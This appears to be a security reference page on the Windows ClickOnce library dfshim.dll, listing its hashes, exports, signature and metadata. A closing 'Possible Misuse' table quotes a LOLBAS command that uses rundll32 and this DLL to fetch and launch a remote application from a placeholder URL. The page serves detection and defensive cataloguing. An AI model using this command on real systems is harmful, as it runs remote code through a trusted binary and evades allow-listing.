---
title: dfshim.dll | ClickOnce Application Deployment Support Library
excerpt: What is dfshim.dll?
---

# dfshim.dll 

* File Path: `C:\Windows\system32\dfshim.dll`
* Description: ClickOnce Application Deployment Support Library

## Hashes

Type | Hash
-- | --
MD5 | `85471BF1E885DF57FF1EE9772BAFCC35`
SHA1 | `898C0B9415524BFEBB1DD5EDB1CAA9DC91F19363`
SHA256 | `65CB5A9E02A25267AC0CEDD9CA048DFE45C38B8D0FD224773450F9799BDA7FB0`
SHA384 | `4A543660C7C4117AFC2B6072A1CF7ABB91DD48607C56AE4927AEF876702FB70247A6366597495F0BD81DB4743649ED6F`
SHA512 | `C085F33E152A92263F71325864BC939EE16A6A0A3377385C817DBBC7DEBDAC9CE5F32C5C67011292CDFB82AB2B57AE84D774EE732621EA821569008B172169C2`
SSDEEP | `12288:Yv86KwAE1oHnkWR/WBbavF0w6CTz5de1RxIKxbWJxKORHtd4cnBZ3H+U6uU85WNa:LWHMnko65rM+p9fkyt7KLgHt7o`
IMP | `71F2605719AC7F33662181495B79B766`
PESHA1 | `827C99BE1B389DD22B1C12F32DC493231C73BC45`
PE256 | `164D8FD78D69A8D4823C1FF12C70ED97AC6EBB7D0222BF2AA8D34B22B6C31C20`

## DLL Exports:

Function Name | Ordinal | Type
-- | -- | --
`ShArpMaintainW` | 10 | Exported Function
`ShOpenVerbApplication` | 11 | Exported Function
`ShArpMaintain` | 9 | Exported Function
`LaunchApplication` | 7 | Exported Function
`ParseManifest` | 8 | Exported Function
`ShOpenVerbShortcut` | 15 | Exported Function
`ShOpenVerbShortcutW` | 16 | Exported Function
`ShOpenVerbExtensionW` | 14 | Exported Function
`ShOpenVerbApplicationW` | 12 | Exported Function
`ShOpenVerbExtension` | 13 | Exported Function
`DllCanUnloadNow` | 18 | Exported Function
`DllGetClassObject` | 19 | Exported Function
`CreateCMSFromXml` | 2 | Exported Function
`CleanOnlineAppCache` | 17 | Exported Function
`CreateActContext` | 1 | Exported Function
`GetUserStore` | 5 | Exported Function
`KillService` | 6 | Exported Function
`GetUserStateManager` | 4 | Exported Function
`GetCurrentActContext` | 3 | Exported Function
`GetDeploymentDataFromManifest` | 20 | Exported Function


## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: dfshim.dll
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/65cb5a9e02a25267ac0cedd9ca048dfe45c38b8d0fd224773450f9799bda7fb0/detection/


## Possible Misuse

*The following table contains possible examples of `dfshim.dll` being misused. While `dfshim.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dfsvc.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dfsvc.yml) | `- Command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo ` | 



MIT License. Copyright (c) 2020 Strontic.


